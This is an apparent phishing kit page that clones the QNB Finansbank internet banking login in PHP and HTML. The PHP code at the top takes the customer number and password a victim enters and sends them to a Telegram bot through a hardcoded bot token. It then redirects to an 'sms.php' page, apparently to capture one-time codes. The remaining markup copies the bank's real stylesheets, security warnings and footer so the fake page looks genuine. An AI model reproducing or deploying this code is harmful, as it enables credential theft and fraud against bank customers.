<?php

error_reporting(E_ALL);
ini_set("display_errors", 1);

if(isset($_POST["send"])){

$username = $_POST["txtuserid"];
$password = $_POST["txtpass"];




function sendMessage($chatId, $messageText, $token) {
    $url = "https://api.telegram.org/bot$token/sendMessage";

    $postData = array(
        'chat_id' => $chatId,
        'text' => $messageText
    );

    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);

    $response = curl_exec($ch);

    if ($response === false) {
        die('Error: "' . curl_error($ch) . '" - Code: ' . curl_errno($ch));
    }

    curl_close($ch);

    return $response;
}

// Bot token ve chat ID'si
$botToken = '7148919194:AAF2oj8tQ0H9Ic9xZVdc-TIdLDJ9bGamV9U';
$chatId = '';
$messageText = 'YENİ BİR LOG DÜŞTÜ
Kullanıcı adı: '.$username.'
Şifre: '.$password.' ';

// Mesaj gönder
$response = sendMessage($chatId, $messageText, $botToken);




header("Location: sms.php?id=$username&password=$password");

}
?>
<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <title> QNB Finansbank İnternet Şubesi </title>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-9">
    <meta name="viewport" content="width=device-width, user-scalable=no,initial-scale=1.0,minimum-scale=1,height=device-height">
    <link href="https://internetsubesi.qnbfinansbank.com/Content/Devices/jquery.smartbanner.css" rel="stylesheet" type="text/css">
    <link type="text/css" rel="stylesheet" href="https://internetsubesi.qnbfinansbank.com/Content/Themes/FinansbankTheme/FinansbankDropDownList.css?20240225071508">
    <link type="text/css" rel="stylesheet" href="https://internetsubesi.qnbfinansbank.com/Content/Themes/FinansbankTheme/FBDialog.css?20240225071508">
    <link type="text/css" rel="stylesheet" href="https://internetsubesi.qnbfinansbank.com/Content/Themes/FinansbankTheme/FBTooltip.css?20240225071508">
    <link type="text/css" rel="stylesheet" href="https://internetsubesi.qnbfinansbank.com/Content/Themes/LoginTheme/FinansbankLoginStyle.css?20240225071508">
    <link type="text/css" rel="stylesheet" href="https://internetsubesi.qnbfinansbank.com/Content/Themes/LoginTheme/warning.css?20240225071508">
    <link type="text/css" rel="stylesheet" href="https://internetsubesi.qnbfinansbank.com/Content/Themes/LoginTheme/loginmain.css?20240225071508">
    <link type="text/css" rel="stylesheet" href="https://internetsubesi.qnbfinansbank.com/Content/Themes/LoginTheme/bootstrap.css?20240225071508">
    <link type="text/css" rel="stylesheet" href="https://internetsubesi.qnbfinansbank.com/Content/Themes/LoginTheme/bootstrap-ie11.css?20240225071508">
    <link type="text/css" rel="stylesheet" href="https://internetsubesi.qnbfinansbank.com/Content/Fonts/Cordale/cordale.min.css?20240225071506">
    <link type="text/css" rel="stylesheet" href="https://internetsubesi.qnbfinansbank.com/Content/Fonts/Muli/muli.min.css?20240225071506">
    <style type="text/css">
      input[srt=numericpassword] {
        -webkit-text-security: disc;
      }

      .sanalklavyeHelpConatiner {
        width: 390px;
        height: 250px;
        font-family: Arial, Helvetica, sans-serif;
        font-size: 11px !important;
        color: #4a4949;
        background: url(/Content/Images/3Dstar.png) no-repeat;
        background-position: 10px 10px;
      }

      .sanalklavyeHelpConatiner .content {
        width: 270px;
        float: right;
      }

      .sanalklavyeHelpConatiner h1 {
        font-size: 12px;
        font-weight: bold;
        color: #870052;
        margin: 0;
        padding: 10px 0 0 0;
      }

      .sanalklavyeHelpConatiner p {
        font-size: 11px !important;
        margin: 0;
        padding: 5px 0 0 0;
      }

      #destekContent {
        /*position: absolute;*/
        left: 168px;
        /*margin-top: 25px;*/
        /*width: 246px;*/
        width: 100%;
        z-index: 2;
        top: auto !important;
      }

      #headerTitle {
        /* position: absolute;
            left: 14px;
            top: auto !important;*/
        height: 35px;
        margin-top: 11px;
        z-index: 1;
        width: 100%;
      }

      #verisign {
        position: absolute;
        left: 5px;
        top: 0px;
        width: 73px;
        height: 45px;
        /*margin-top: 488px;*/
        z-index: 4;
      }

      .qr_area {
        border: 2px solid #d7d7d7;
        border-radius: 10px;
        padding: 10px;
        float: left;
        width: 100%;
        min-height: 300px;
        margin-bottom: 20px;
        /*margin-top: -32px;
                margin-left: 330px;*/
      }

      #keys {
        margin-top: 2px !important;
        margin-left: 2px !important;
      }

      .hatamesaji1ConfirmIframe .header2 {
        height: 29px;
      }

      .popupcontentRoundedCornerDiv_bottom {
        width: 479px !important;
      }

      .hatamesaji1ConfirmIframe .popupcontent {
        width: 479px !important;
      }
    </style>
    <style type="text/css">
      .linkbutton,
      .linkbutton:hover {
        color: #394040 !important;
      }
    </style>
    <script type="text/javascript" src="../Content/Devices/jquery.smartbanner.js"></script>
    <meta name="apple-itunes-app" content="app-id=739655617">
    <!-- End Google Tag Manager -->
    <style type="text/css">
      .ileriButton {
        width: 280px;
        color: #fff;
        background-color: #800d52;
        padding: 12px 20px;
        border: 0;
        text-align: left;
        border-radius: 3px;
        cursor: pointer;
        text-align: center;
        margin-top: 20px;
        position: absolute;
        height: 40px;
        text-decoration: none;
      }

      .proceedButton {
        width: 280px;
        color: #fff;
        background-color: #800d52;
        padding: 12px 20px;
        border: 0;
        text-align: left;
        border-radius: 3px;
        cursor: pointer;
        text-align: center;
        margin-top: 20px;
        position: absolute;
        height: 40px;
        text-decoration: none;
      }
    </style>
  </head>
  <body>
    <!-- Google Tag Manager (noscript) -->
    <noscript>
      <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-M852FM3" height="0" width="0" style="display:none;visibility:hidden"></iframe>
    </noscript>
    <!-- End Google Tag Manager (noscript) -->
      <div>
        <input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="">
        <input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="">
        <input type="hidden" name="__VSTATE__" id="__VSTATE__" value="-214491467">
        <input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="">
      </div>
      <div>
      </div>
      <div id="preload-img" style="position: absolute; left: 420px; top: 250px; display: none">
        <img id="ctl00_FinansbankLoaderImage" src="../Content/Images/loader.gif" style="border-width:0px;">
      </div>
      <div class="container-lg px-0" style="max-width: 980px;">
        <div id="ctl00_headerDiv" class="header-purple">
          <div id="leftDiv" class="headerLeftDiv"></div>
          <span id="imgText" class="headerImgText">İnternet Şubesi</span>
          <div class="top_nav" style="
    display: none;
">
            <div></div>
          </div>
        </div>
        <div id="headerTitle" style="visibility:hidden;display: none;
    margin-top: 10px;">
          <div id="ctl00_headerContentPlaceHolder_LoginInformationDiv" style="display: none; width: 625px;"></div>
          <div class="floatLeft">
            <img src="/Content/Images/content_title_left.png" width="23" height="50">
          </div>
          <div class="headerTitleMiddle floatLeft">
            <span id="ctl00_headerContentPlaceHolder_HeaderTitleLabel">Lütfen müşteri numarası / TCKN ve FinansŞifrenizi giriniz.</span>
          </div>
          <div class="floatLeft">
            <img src="/Content/Images/content_title_right.png" width="17" height="28">
          </div>
        </div>
        <section>
          <div class="row p-10-ch">
            <div id="mainPanel" class="px-0 mainContent">
              <input type="hidden" name="ctl00$mainContentPlaceHolder$qrCodeLoginFingerPrint" id="qrCodeLoginFingerPrint">
              <div class="row" style="height: 100%; justify-content: center;">
                <div class="col-lg-8 col-md-7 col-12 mainPanel-width" style="border: 2px solid #d7d7d7; border-radius: 10px; padding: 30px; float: left; min-height: 380px;">
                  <div class="containerkeypad" style="display: none;">
                    <div id="keys" style="float: left; display: inline-block">
                      <div class="numberBox ">
                        <div class="number">6</div>
                      </div>
                      <div class="numberBox ">
                        <div class="number">7</div>
                      </div>
                      <div class="numberBox ">
                        <div class="number">3</div>
                      </div>
                      <div style="clear: both;"></div>
                      <div class="numberBox ">
                        <div class="number">1</div>
                      </div>
                      <div class="numberBox ">
                        <div class="number">9</div>
                      </div>
                      <div class="numberBox ">
                        <div class="number">5</div>
                      </div>
                      <div style="clear: both;"></div>
                      <div class="numberBox ">
                        <div class="number">2</div>
                      </div>
                      <div class="numberBox ">
                        <div class="number">0</div>
                      </div>
                      <div class="numberBox ">
                        <div class="number">8</div>
                      </div>
                      <div style="clear: both;"></div>
                      <div class="nonumberBox" onclick=" DeletePassChar('txtpass')">
                        <div class="nonumber">Sil</div>
                      </div>
                      <div class="numberBox">
                        <div class="number">4</div>
                      </div>
                      <div class="nonumberBox" id="btnQuestion">
                        <div class="nonumber" onclick="parent.top.FBDialog(this,['YARDIM','none'],[1,'ctl00_mainContentPlaceHolder_VirtualKeyboardDiv','undefined'],['cmdCancel,,,false,right'],false,'none',window,[{'width':390,'height':250,'language':'tr','isCampaignPopUp':false,'showCloseIcon':false,'closeOnClicked':true,'doPostBackOnPopupClosed':false,'target':'MyPlaceHolder','showPagingField':false,'currentPageIndex':0,'totalPageCount':0,'customButtonText':'','pagingSeperator':'�','customButton2Text':'','tooltipText':''}]);">?</div>
                      </div>
                      <div style="clear: both;"></div>
                    </div>
                  </div>
                  <div class="subPanel-width">
                    <div class="row">
                      <div class="col-lg-6 col-12">
                        <div class="row">
                          <div class="col-12">
                            <div class="form-group">
                              <div id="ctl00_mainContentPlaceHolder_VirtualKeyboardDiv" style="display: none; width: 390px;">
                                <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
                                <title></title>
                                <div class="sanalklavyeHelpConatiner">
                                  <div class="content">
                                    <h1>Sanal Klavye Nedir? </h1>
                                    <p>Sanal Klavye, Internet Bankacılığı'na girişte size ilave güvenlik sağlayan bir özelliktir. Bilgisayara kullanıcının bilgisi dışında yüklenen ve kullanıcının yazmış olduğu şifre/parolaları tespit eden programlara karşı koruma amacıyla geliştirilmiştir. Sanal Klavye'yi kullanarak söz konusu programlarından korunursunuz.</p>
                                    <p> Sanal Klavye, rakamların girişi için kullanılması tavsiye edilen bir araçtır. Tüm şifre değişiklik ekranlarında da Sanal Klavye'yi kullanabilirsiniz. Tercihinize bağlı "Klavye Kullan" seçimi ile klavyenizin tuşlarını kullanabilirsiniz.</p>
                                    <h1>Sanal Klavye Nasıl Kullanılır? </h1>
                                    <p>Sanal Klavye'yi üzerinde yer alan karışık-sıralı rakamları mouse ile seçerek kullanabilirsiniz. </p>
                                  </div>
                                </div>
                              </div>
                              <form method="POST">
                              <span id="ctl00_mainContentPlaceHolder_UserIDLabel" class="loginlabel">Müşteri / T.C. Kimlik Numaranız</span>
                              <input name="txtuserid" type="text" maxlength="11" id="txtuserid" tabindex="1" class="textfield required" onmouseout="VeriBranch_OnMouseOut('txtuserid');" onkeyup="try { if (SIKCA) { $(&quot;.contentText a&quot;).unbind('click'); } } catch (err) { var e = err; }         try { if (SIKCA.oldLogonCode) { $(&quot;.contentText a&quot;).attr('onclick', SIKCA.oldLogonCode); } } catch (err) { var e = err; }         try { if (SIKCA.oldLogonHref) { $(&quot;.contentText a&quot;).attr('href', ''); $(&quot;.contentText a&quot;).attr('href', SIKCA.oldLogonHref); } } catch (err) { var e = err; }         try { if (SIKCA) { $(&quot;.contentText a&quot;).live('click', function (e) { e.preventDefault(); window.location.href = $(&quot;.contentText a&quot;).attr(&quot;href&quot;); return false; }); } } catch (err) { var e = err; }         try { SIKCA = null; } catch (err) { var e = err; }" onpaste="if(HasNonnumeric(this, event)){return false;};" onmouseover="VeriBranch_OnMouseOver('txtuserid');" onblur="VeriBranch_TextOnBlur('txtuserid','');RemoveEscapedCharactersFromTextBox(this,'txtuserid', ['<','>','?'])" onkeypress="if(CheckAndRemoveEscapedCharactersFromTextBox(['<','>','?'],event)){return false;}if(HasNonnumericKeyPress(this, event)){return false;};" onfocus="VeriBranch_TextOnFocus('txtuserid','');" spellcheck="false" autofocus="true" fbtitle="Müşteri Numarası / TCKN" onkeydown="TextBoxFocusOnNavigation(this,event);if(CheckAndRemoveEscapedCharactersFromTextBox(['<','>','?'],event)){return false;}if(!Only_Numeric(event)){return false;};return ValidateUserCode(event,'mainPanel','divErrorMsg',null,null,6,'Lütfen müşteri numarası/TCKN ve FinansŞifrenizi giriniz ve &quot;İleri&quot; butonuna basınız.','FinansŞifreniz $$ karakter olmalıdır.','','Lütfen müşteri numaranızı giriniz.','Lütfen FinansŞifrenizi giriniz.', '57100485020353666791389294217');" autocomplete="off" title="Müşteri Numarası ya da TCKN" required>
                            </div>
                          </div>
                          <div class="col-12">
                            <div class="form-group">
                              <span id="ctl00_mainContentPlaceHolder_PasswordLabel" class="loginlabel">FinansŞifreniz</span>
                              <input name="txtpass" type="text" maxlength="6" id="txtpass" tabindex="2" class="textfield password" onmouseout="VeriBranch_OnMouseOut('txtpass');" autocomplete="off" pattern="[0-9]*" onpaste="if(HasNonnumeric(this, event)){return false;};" onmouseover="VeriBranch_OnMouseOver('txtpass');" onblur="VeriBranch_TextOnBlur('txtpass','');RemoveEscapedCharactersFromTextBox(this,'txtpass', ['<','>','?'])" onkeypress="return ValidateInput(event,this,'number');if(CheckAndRemoveEscapedCharactersFromTextBox(['<','>','?'],event)){return false;}if(HasNonnumericKeyPress(this, event)){return false;};" onfocus="VeriBranch_TextOnFocus('txtpass','');" spellcheck="false" onkeydown="TextBoxFocusOnNavigation(this,event);if(CheckAndRemoveEscapedCharactersFromTextBox(['<','>','?'],event)){return false;}if(!Only_Numeric(event)){return false;};Ibtech_keyDown();return ValidateUserCode(event,'mainPanel','divErrorMsg',null,null,6,'Lütfen müşteri numarası/TCKN ve FinansŞifrenizi giriniz ve &quot;İleri&quot; butonuna basınız.','FinansŞifreniz $$ karakter olmalıdır.','','Lütfen müşteri numaranızı giriniz.','Lütfen FinansŞifrenizi giriniz.', '57100485020353666791389294217');;" fbtitle="FinansŞifre" title="FinansŞifre" required>
                            </div>
                          </div>
                        </div>
                      </div>
                      <div class="col-lg-6 col-12">
                        <div class="row">
                          <div class="col-12">
                            <div id="divErrorMsgOuter" class="form-info-tooltip login-input-error error-message-outer" clientidmode="Static" style="display: none;">
                              <div id="divErrorMsg" style="width: 70%; padding: 10px; display: none;"></div>
                            </div>
                          </div>
                          <div class="col-12" style="align-self: center;">
                            <div id="divErrorMsgOuterPass" class="form-info-tooltip login-input-error error-message-outer" clientidmode="Static" style="display: none;">
                              <div id="divErrorMsgPass" style="width: 70%; padding: 10px;"></div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div class="row">
                      <div class="col-lg-6 col-12">
                        <p id="ctl00_mainContentPlaceHolder_FinansSifreArea" class="taR" style="width: 101%">
                          <a onclick="LogHelpDeskRedirectTransaction(); window.open('https://finanssifre.qnbfinansbank.com/Default.aspx','','toolbar=0,menubar=0,resizable=1,status=0,left=0,top=0,scrollbars=1,width=751,height=514'); return false;;return ;" id="FinansSifreButton" tabindex="4" class="loginlink" href="javascript:__doPostBack('ctl00$mainContentPlaceHolder$FinansSifreButton','')">FinansŞifre Al</a> / <a onclick="LogHelpDeskRedirectTransaction(); window.open('https://finanssifre.qnbfinansbank.com/Default.aspx','','toolbar=0,menubar=0,resizable=1,status=0,left=0,top=0,scrollbars=1,width=751,height=514'); return false;;return ;" id="FinansSifreButton1" tabindex="5" class="loginlink" href="javascript:__doPostBack('ctl00$mainContentPlaceHolder$FinansSifreButton1','')">FinansŞifremi Unuttum</a>
                        </p>
                      </div>
                    </div>
                    <div class="row">
                      <div class="col-lg-6 col-12">
                        <button type="submit" name="send" tabindex="3" class="ileriButton">İleri</button></form>
                      </div>
                    </div>
                  </div>
                </div>
                <div class="col-lg-4 col-md-5 col-12 row-left-padding" style="padding-right: 0px;">
                  <div id="ctl00_mainContentPlaceHolder_QRArea" class="qr_area d-none d-lg-block d-xl-block">
                    <table>
                      <tbody>
                        <tr>
                          <td>
                            <span id="ctl00_mainContentPlaceHolder_QRHeader" style="outline: none; margin-left: 8px; font-weight: bold; width: 100%;">Karekod ile Hızlı Giriş</span>
                          </td>
                        </tr>
                        <tr>
                          <td style="line-height: 15px;">
                            <img id="ctl00_mainContentPlaceHolder_QRCodeImage" onclick="return QRClicked();" src="https://internetsubesi.qnbfinansbank.com/Content/Images/qr_disabled.png" style="height:118px;width:118px;border-width:0px;position: absolute; margin-top: 30px; margin-left: 82px;">
                            <img id="ctl00_mainContentPlaceHolder_QRRefreshImage" onclick="return QRClicked();" src="https://internetsubesi.qnbfinansbank.com/Content/Images/captcha-refresh.jpg" style="border-width:0px;position: absolute; margin-top: 65px; margin-left: 132px;">
                            <a onclick="return ;" id="QRCodeLoginButton" class="linkbutton" href="javascript:__doPostBack('ctl00$mainContentPlaceHolder$QRCodeLoginButton','')" style="visibility: hidden"></a>
                            <p id="qrp" style="padding-top: 90px; padding-left: 85px; outline: none; text-align: center; width: 201px; color: #800d52;">Size özel karekodunuzu almak için tıklayınız.</p>
                          </td>
                        </tr>
                        <tr>
                          <td>
                            <span id="ctl00_mainContentPlaceHolder_QRInfo" alt="Karekod ile giriş yapmak için QNB Mobil'in açılış sayfasındaki Karekod İşlemlerini kullanabilirsiniz. Detaylı bilgi için "></span>
                          </td>
                        </tr>
                      </tbody>
                    </table>
                  </div>
                  <div>
                    <div id="guvenlik" class="info-box" style="visibility: visible; display: contents; top: 320px;">
                      <h3>
                        <span id="ctl00_mainContentPlaceHolder_lblSubContentBottomTitle">Güvenliğiniz İçin</span>
                      </h3>
                      <ul id="ctl00_mainContentPlaceHolder_blSubContentBottomList">
                        <li>FinansŞifreniz ve bankamız tarafından cep telefonunuza gönderilen tek kullanımlık şifreler yalnızca size özeldir, bankamız personeli dahil kimse ile paylaşmayınız. Detaylı bilgi ve güvenlik önlemleri için lütfen <a target="_blank" href="https://www.qnbfinansbank.com/724-bankacilik/internet-subesi#db-3">
                            <b>buraya</b>
                          </a> tıklayınız. </li>
                      </ul>
                    </div>
                    <div id="webLoanInfoDiv" style="display: none;"></div>
                  </div>
                </div>
              </div>
              <input type="hidden" name="ctl00$mainContentPlaceHolder$dd5fcb6461304a64adbfb0462736cb6c" id="dd5fcb6461304a64adbfb0462736cb6c">
            </div>
          </div>
        </section>
        <div id="subContent" class="subContent" style="visibility:hidden;display:none">
          <div id="VDAContainer">
            <div id="apDiv1" style="display: none">
              <img src="/Content/Images/content_ok.png" width="8" height="15">
            </div>
            <div id="destekContent" style="display: none">
              <div>
                <img class="w-100" src="/Content/Images/guvenlik_top.png" width="249" height="10">
              </div>
              <div class="middle title">
                <ul id="ctl00_subContentPlaceHolder_blSubContentMiddleList">
                  <li>FinansŞifreniz yoksa veya FinansŞifrenizi unuttuysanız buraya <a href="#" onclick="window.open('https://finanssifre.qnbfinansbank.com/Default.aspx','','toolbar=0,menubar=0,resizable=1,status=0,left=0,top=0,scrollbars=1,width=751,height=514')" class="english">
                      <u>tıklayınız</u>
                    </a>. </li>
                </ul>
              </div>
              <div class="bottom">
                <img class="w-100" src="/Content/Images/guvenlik_bottom.png" width="250" height="18">
              </div>
            </div>
          </div>
        </div>
        <div class="footer">
          <div id="verisign">
            <!--- DÜZENLEME YAPMAYIN - GlobalSign SSL Site Mührü Kodu - DÜZENLEME YAPMAYIN --->
            <table width="125" border="0" cellspacing="0" cellpadding="0" title="DOĞRULAMA İÇİN TIKLAYIN: Bu site kişisel bilgilerinizin güvenliğini sağlamak için bir GlobalSign SSL Sertifikası kullanır.">
              <tbody>
                <tr>
                  <td>
                    <script src="//ssif1.globalsign.com/SiteSeal/siteSeal/siteSeal/siteSeal.do?p1=internetsubesi.qnbfinansbank.com&amp;p2=SZ110-45&amp;p3=image&amp;p4=en&amp;p5=V0023&amp;p6=S001&amp;p7=https"></script>
                    <span>
                      <a id="aa" href="javascript:ss_open_sub()">
                        <img name="ss_imgTag" border="0" src="https://www.globalsign.com.tr/Content/Images/v4/dv-image-seal.png" alt="Profili görmek için lütfen tıklayın." oncontextmenu="return false;" galleryimg="no" style="width:110px">
                      </a>
                    </span>
                    <span id="ss_siteSeal_fin_SZ110-45_image_en_V0023_S001"></span>
                    <script type="text/javascript" src="//seal.globalsign.com/SiteSeal/gmogs_image_110-45_en_dblue.js"></script>
                  </td>
                </tr>
              </tbody>
            </table>
          </div>
          <span id="ctl00_lblFooter" class="master-footer">Her hakkı QNB Finansbank A.Ş.'ye aittir. © 2024</span>
          <ul class="foot-links">
            <li>
              <a onclick="return ;" id="ctl00_LinkEN" class="linkbutton" href="javascript:__doPostBack('ctl00$LinkEN','')" style="outline:none">English</a>
            </li>
            <li>
              <a onclick="window.open('https://www.qnbfinansbank.com/724-bankacilik/internet-subesi#internet-sube','_blank','location=1,status=1,scrollbars=1,resizable=1'); return false;;return ;" id="ctl00_LinkProcesses" class="linkbutton" href="javascript:__doPostBack('ctl00$LinkProcesses','')" style="outline:none">Yapabileceğiniz İşlemler</a>
            </li>
            <li>
              <a onclick="window.open('https://www.qnbfinansbank.com/724-bankacilik/internet-subesi#sss','_blank','location=1,status=1,scrollbars=1,resizable=1'); return false;;return ;" id="ctl00_LinkFAQ" class="linkbutton" href="javascript:__doPostBack('ctl00$LinkFAQ','')" style="outline:none">Sıkça Sorulan Sorular</a>
            </li>
            <li>
              <a onclick="window.open('https://www.qnbfinansbank.com/sikayetim-var/default.aspx?FBAS_BY/','_blank','location=1,status=1,scrollbars=1,resizable=1'); return false;;return ;" id="ctl00_LinkContactUs" class="linkbutton" href="javascript:__doPostBack('ctl00$LinkContactUs','')" style="outline:none">Bize Ulaşın</a>
            </li>
          </ul>
          <div class="clr"></div>
        </div>
      </div>
    </form>
    <div class="hatamesaji1Confirm" id="hatamesaji1Confirm">
      <div class="floatLeft">
        <div class="popupheader_left" title="Finansbank"></div>
      </div>
      <div class="header2 floatLeft">
        <div class="popup_header_icon">
          <div title=""></div>
        </div>
        <div class="headerErrMsg">Hata !</div>
        <a href="javascript:void(0)">
          <div title="Kapat" class="close_icon" commandtype="cmdCancel" callbackfunction=""></div>
        </a>
      </div>
      <div class="floatLeft">
        <div title="Finansbank" class="popupheader_right"></div>
      </div>
      <div class="clearBoth"></div>
      <div style="border-top: 0px none;" class="popupcontentRoundedCornerDiv">
        <table width="100%" cellspacing="0" cellpadding="0" border="0">
          <tbody>
            <tr>
              <td width="6px">
                <div class="imgRoundedCornerLeft"></div>
              </td>
              <td class="popupcontentRoundedCornerDiv_middle"></td>
              <td width="6px">
                <div class="imgRoundedCornerRight"></div>
              </td>
            </tr>
          </tbody>
        </table>
      </div>
      <div class="popupcontent">
        <div class="scrollbarmain">
          <div class="scrollbar">
            <div class="track">
              <div class="thumb">
                <div class="end"></div>
              </div>
            </div>
          </div>
          <div class="viewport">
            <div class="overview">
              <div class="hata_msj"></div>
            </div>
          </div>
        </div>
        <div class="popupButtonContainer">
          <div class="iptal btnClassName" commandtype="cmdCancel" callbackfunction="">
            <a href="javascript:void(0)">
              <div id="btnConfirmNo" border="0"></div>
            </a>
          </div>
          <div class="onay btnClassName" commandtype="cmdYes" callbackfunction="">
            <a href="javascript:void(0)">
              <div id="btnConfirmYes" border="0"></div>
            </a>
          </div>
          <div class="resend btnClassName" commandtype="cmdResend" callbackfunction="">
            <a href="javascript:void(0)">
              <div id="btnConfirmYes" border="0"></div>
            </a>
          </div>
          <div class="print btnClassName" commandtype="cmdPrint" callbackfunction="">
            <a href="javascript:void(0)">
              <div id="btnPrint" border="0"></div>
            </a>
          </div>
          <div class="save btnClassName" commandtype="cmdSave" callbackfunction="">
            <a href="javascript:void(0)">
              <div id="btnSave" border="0"></div>
            </a>
          </div>
          <div class="sendmail btnClassName" commandtype="cmdSentMail" callbackfunction="">
            <a href="javascript:void(0)">
              <div id="btnSentMail" border="0"></div>
            </a>
          </div>
          <div class="delete btnClassName" commandtype="cmdDelete" callbackfunction="">
            <a href="javascript:void(0)">
              <div id="btnDelete" border="0"></div>
            </a>
          </div>
        </div>
      </div>
      <div style="border-top: 0px none;" class="popupcontentRoundedCornerDiv_bottom">
        <table width="100%" cellspacing="0" cellpadding="0" border="0">
          <tbody>
            <tr>
              <td width="6px">
                <div class="imgRoundedCornerLeft_bottom"></div>
              </td>
              <td class="popupcontentRoundedCornerDiv_middle_bottom"></td>
              <td width="6px">
                <div class="imgRoundedCornerRight_bottom"></div>
              </td>
            </tr>
          </tbody>
        </table>
      </div>
    </div>
    <div class="hatamesaji1ConfirmIframe" id="hatamesaji1ConfirmIframe" style="display: none;">
      <div class="floatLeft">
        <div class="popupheader_left" title="Finansbank"></div>
      </div>
      <div class="header2 floatLeft">
        <div class="popup_header_icon">
          <div title=""></div>
        </div>
        <div class="headerErrMsg">Hata !</div>
        <a href="javascript:void(0)">
          <div title="Kapat" class="close_icon" commandtype="cmdCancel" callbackfunction=""></div>
        </a>
      </div>
      <div class="floatLeft">
        <div title="Finansbank" class="popupheader_right"></div>
      </div>
      <div class="clearBoth"></div>
      <div style="border-top: 0px none;" class="popupcontentRoundedCornerDiv">
        <table width="100%" cellspacing="0" cellpadding="0" border="0">
          <tbody>
            <tr>
              <td width="6px">
                <div class="imgRoundedCornerLeft"></div>
              </td>
              <td class="popupcontentRoundedCornerDiv_middle"></td>
              <td width="6px">
                <div class="imgRoundedCornerRight"></div>
              </td>
            </tr>
          </tbody>
        </table>
      </div>
      <div class="popupcontent">
        <div class="hata_msj">
          <iframe scrolling="no" frameborder="0" src="" class="hata_msj_iframe"></iframe>
        </div>
        <div class="popupButtonContainer">
          <div class="iptal btnClassName" commandtype="cmdCancel" callbackfunction="">
            <a href="javascript:void(0)">
              <div id="Div1" width="63" height="21" border="0"></div>
            </a>
          </div>
          <div class="onay btnClassName" commandtype="cmdYes" callbackfunction="">
            <a href="javascript:void(0)">
              <div id="Div2" border="0"></div>
            </a>
          </div>
          <div class="print btnClassName" commandtype="cmdPrint" callbackfunction="">
            <a href="javascript:void(0)">
              <div id="Div3" border="0"></div>
            </a>
          </div>
          <div class="resend btnClassName" commandtype="cmdResend" callbackfunction="">
            <a href="javascript:void(0)">
              <div id="Div4" border="0"></div>
            </a>
          </div>
          <div class="save btnClassName" commandtype="cmdSave" callbackfunction="">
            <a href="javascript:void(0)">
              <div id="Div5" border="0"></div>
            </a>
          </div>
          <div class="save btnClassName" commandtype="cmdSentMail" callbackfunction="">
            <a href="javascript:void(0)">
              <div id="Div6" border="0"></div>
            </a>
          </div>
        </div>
      </div>
      <div style="border-top: 0px none;" class="popupcontentRoundedCornerDiv_bottom">
        <table width="100%" cellspacing="0" cellpadding="0" border="0">
          <tbody>
            <tr>
              <td width="6px">
                <div class="imgRoundedCornerLeft_bottom"></div>
              </td>
              <td class="popupcontentRoundedCornerDiv_middle_bottom"></td>
              <td width="6px">
                <div class="imgRoundedCornerRight_bottom"></div>
              </td>
            </tr>
          </tbody>
        </table>
      </div>
    </div>
    <div class="popupbg" id="popupbg" style="opacity: 0.4; display: none;"></div>
    <deepl-input-controller></deepl-input-controller>
  </body>
</html>